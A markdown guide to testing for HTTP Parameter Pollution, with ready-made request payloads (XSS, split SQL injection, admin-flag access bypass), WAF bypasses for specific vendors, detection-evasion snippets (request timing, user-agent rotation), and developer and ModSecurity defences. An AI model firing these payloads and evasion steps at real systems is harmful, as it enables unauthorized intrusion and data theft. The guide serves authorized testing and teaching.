# HTTP Parameter Pollution (HPP) Testing Guide

## Overview

HTTP Parameter Pollution exploits inconsistencies in how different web technologies parse duplicate or specially formatted parameters. When a WAF and backend application parse parameters differently, attackers can craft requests that pass WAF validation but deliver malicious payloads to the backend.

## How Different Technologies Handle Duplicate Parameters

| Technology | Behavior | Example Result |
|-----------|----------|----------------|
| PHP/Apache | Uses **LAST** occurrence | `?id=1&id=2` → `$_GET['id'] = "2"` |
| ASP.NET/IIS | **Concatenates** with comma | `?id=1&id=2` → `Request["id"] = "1,2"` |
| JSP/Tomcat | Uses **FIRST** occurrence | `?id=1&id=2` → `request.getParameter("id") = "1"` |
| Node.js/Express | Creates an **ARRAY** | `?id=1&id=2` → `req.query.id = ["1","2"]` |
| Python/Django | Uses **LAST** occurrence | `?id=1&id=2` → `request.GET['id'] = "2"` |

## Core Attack Techniques

### 1. First-Last Ambiguity
**Concept**: WAF checks first parameter, backend uses last (or vice versa)

```http
# For PHP/Apache (uses last)
GET /search?query=safe&query=<script>alert(1)</script>

# For Tomcat/JSP (uses first)  
GET /search?query=<script>alert(1)</script>&query=safe
```

**Why it works**: WAF sees "safe" value, backend processes the malicious one

### 2. Array Notation Confusion
**Concept**: PHP interprets `[]` as array notation, but WAF may not parse it correctly

```http
# WAF sees "param" as one parameter
# PHP creates $_GET['param'] = array("safe", "malicious")
GET /api?param[]=safe&param[]=<script>alert(1)</script>

# Mixed notation
GET /api?param=safe&param[]=<script>alert(1)</script>

# Nested arrays
GET /api?param[safe]=1&param[xss]=<script>alert(1)</script>
```

### 3. ASP.NET Concatenation Exploitation
**Concept**: ASP.NET concatenates duplicate params with comma - split attack across params

```http
# XSS split across parameters
# Results in: "<script,>alert(1),</script>"
GET /page.aspx?input=<script&input=>alert(1)&input=</script>

# SQLi split
# Results in: "1',UNION,SELECT,NULL--"
GET /user.aspx?id=1'&id=,UNION&id=,SELECT&id=,NULL--
```

### 4. Encoding Confusion
**Concept**: First param plain (WAF checks), second param encoded (backend decodes)

```http
# One plain, one URL-encoded
GET /search?q=safe&q=%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
GET /search?q=safe&q=%253Cscript%253E

# Case variation in param names
GET /search?q=safe&Q=<script>alert(1)</script>
```

### 5. Separator Confusion
**Concept**: Some parsers treat `;` or other chars as parameter separators

```http
# Semicolon as separator
GET /api?id=1;id=<script>alert(1)</script>

# Null byte separator
GET /api?id=1%00&id=<script>alert(1)</script>

# Newline injection
GET /api?id=1%0a&id=<script>alert(1)</script>
```

### 6. Mixed HTTP Method Pollution
**Concept**: Send parameter in BOTH query string and POST body

```http
POST /api?id=1 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

id=<script>alert(1)</script>
```

**Result**: Some frameworks merge `$_GET` and `$_POST` - WAF might only check one location

## WAF-Specific Bypasses

### ModSecurity
- **Behavior**: Often checks first parameter occurrence
- **Bypass**: Place clean value first, malicious second

```http
GET /search?q=safe&q=<script>alert(1)</script>
GET /search?q[]=safe&q[]=<script>alert(1)</script>
```

### Cloudflare WAF
- **Behavior**: Case-sensitive in some rule sets
- **Bypass**: Case variation + array notation

```http
GET /api?id=1&ID=<script>alert(1)</script>
GET /api?id[]=safe&id[]=<script>alert(1)</script>
```

### AWS WAF
- **Behavior**: Checks specific parameter patterns
- **Bypass**: Sandwich technique, duplicate clean values

```http
GET /api?id=safe&id=<script>alert(1)</script>&id=safe
GET /api?id=1&id=' UNION SELECT NULL--&id=1
```

### Imperva/Incapsula
- **Bypass**: Null byte injection, semicolon separation

```http
GET /api?param=safe&param%00=<script>alert(1)</script>
GET /api?param=safe;param=<script>alert(1)</script>
```

### F5 ASM
- **Bypass**: Array notation, indexed parameters

```http
GET /api?param[0]=safe&param[1]=<script>alert(1)</script>
GET /api?param.safe=1&param.xss=<script>alert(1)</script>
```

## Testing Methodology

### Step 1: Identify Backend Technology
```bash
# Check server headers
curl -I https://target.com

# Common indicators:
# X-Powered-By: PHP/7.4 → Uses LAST param
# X-AspNet-Version → Concatenates with comma
# Server: Apache-Coyote → Tomcat, uses FIRST param
```

### Step 2: Test Basic Duplication
```bash
# Test which value is used
curl "https://target.com/api?test=FIRST&test=LAST"

# Check response to see which value appears
# FIRST → Tomcat/JSP behavior
# LAST → PHP/Python behavior  
# FIRST,LAST → ASP.NET behavior
```

### Step 3: WAF Fingerprinting
```bash
# Send obviously malicious payload
curl "https://target.com/search?q=<script>alert(1)</script>"
# Note the block page/error

# Try with duplication
curl "https://target.com/search?q=safe&q=<script>alert(1)</script>"
# If this passes → HPP bypass possible
```

### Step 4: Systematic Testing
```bash
# Test all major techniques:

# 1. Basic duplication
?param=safe&param=<xss>

# 2. Array notation
?param[]=safe&param[]=<xss>

# 3. Encoding
?param=safe&param=%3Cxss%3E

# 4. Case variation
?param=safe&PARAM=<xss>

# 5. Separator confusion
?param=safe;param=<xss>

# 6. Mixed methods (POST)
POST with both GET and POST params
```

## Automation with Tools

### Using Burp Suite
1. Capture request in Proxy
2. Send to Intruder
3. Add duplicate parameters with different payloads
4. Use Payload Processing to encode second param
5. Compare responses to identify bypasses

### Using OWASP ZAP
1. Enable "Active Scan"
2. Load custom HPP payloads
3. Configure scan policy for parameter injection
4. Review alerts for successful bypasses

### Custom Script Usage
```bash
# Using the provided scripts
python3 hpp_bypass_techniques.py

# Test specific attack type
python3 hpp_waf_bypass_demo.py

# Against live target (authorized only!)
python3 -c "
from hpp_bypass_techniques import HPPTester
tester = HPPTester('https://target.com/api')
payloads = tester.test_all_techniques('<script>alert(1)</script>')
# Manual review of payloads before firing
"
```

## Real-World Examples

### Example 1: PHP E-commerce Site
**Target**: Product search with ModSecurity WAF
**Attack**: XSS via parameter duplication

```http
# Blocked
GET /search?q=<script>alert(document.cookie)</script>

# Bypassed  
GET /search?q=products&q=<script>alert(document.cookie)</script>
```

### Example 2: ASP.NET Banking Portal
**Target**: Account lookup with custom WAF
**Attack**: SQL injection via concatenation

```http
# Blocked
GET /account?id=1' UNION SELECT * FROM users--

# Bypassed
GET /account?id=1'&id= UNION&id= SELECT&id= *&id= FROM users--
```

### Example 3: JSP Admin Panel
**Target**: User management with Cloudflare
**Attack**: Access control bypass

```http
# Blocked
GET /admin?user=attacker&admin=true

# Bypassed (Tomcat uses first occurrence of "admin")
GET /admin?user=attacker&admin=true&admin=false
```

## Detection Evasion

### 1. Timing-Based Testing
Don't fire all payloads at once - space them out:
```python
import time
for payload in payloads:
    send_request(payload)
    time.sleep(random.uniform(2, 5))
```

### 2. Session Maintenance
Use valid session tokens to appear as authenticated user:
```python
session = requests.Session()
session.cookies.set('auth_token', 'valid_token')
```

### 3. Realistic User-Agent Rotation
```python
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1',
]
```

## Defense Strategies

### For Developers

```python
# Python/Django - Strict parameter handling
def get_param_strict(request, param_name):
    """Only accept single parameter value"""
    values = request.GET.getlist(param_name)
    if len(values) > 1:
        raise ValidationError("Duplicate parameters not allowed")
    return values[0] if values else None

# PHP - Reject duplicates
if (count($_GET) !== count(array_unique(array_keys($_GET)))) {
    die("Error: Duplicate parameters detected");
}

# ASP.NET - Disable concatenation
<appSettings>
  <add key="aspnet:MaxHttpCollectionKeys" value="1000"/>
</appSettings>
```

### For WAF Configuration

```
# ModSecurity rule to detect HPP
SecRule ARGS_NAMES "^(.*)$" \
    "id:1000,\
    phase:2,\
    capture,\
    setvar:'tx.param_%{tx.1}=+1',\
    nolog,\
    pass"

SecRule TX:/^param_/ "@gt 1" \
    "id:1001,\
    phase:2,\
    deny,\
    status:400,\
    msg:'Duplicate parameter detected'"
```

### Best Practices

1. **Parameter Normalization**
   - Normalize parameters BEFORE security checks
   - Use consistent parsing logic across WAF and app

2. **Strict Validation**
   - Reject requests with duplicate parameter names
   - Use parameter allowlists, not blocklists

3. **Framework Hardening**
   - PHP: Set `max_input_vars` limit
   - ASP.NET: Configure `MaxHttpCollectionKeys`
   - Configure frameworks to NOT merge GET/POST/COOKIE

4. **WAF Configuration**
   - Check ALL parameter occurrences
   - Validate after normalization
   - Test WAF with HPP payloads regularly

5. **Monitoring & Logging**
   - Log requests with duplicate parameters
   - Alert on unusual parameter patterns
   - Track parameter count per request

## Legal & Ethical Considerations

⚠️ **IMPORTANT**: HTTP Parameter Pollution testing must ONLY be performed:

- On systems you own or have explicit written authorization to test
- Within the scope defined in your penetration testing agreement
- In compliance with applicable laws and regulations
- With proper safeguards to prevent unintended damage

Unauthorized testing is illegal and unethical.

## Further Reading

- OWASP Testing Guide: Testing for HTTP Parameter Pollution
- CAPEC-460: HTTP Parameter Pollution
- Research papers on WAF bypass techniques
- Vendor-specific WAF documentation

---

**Created for authorized security testing and educational purposes only**
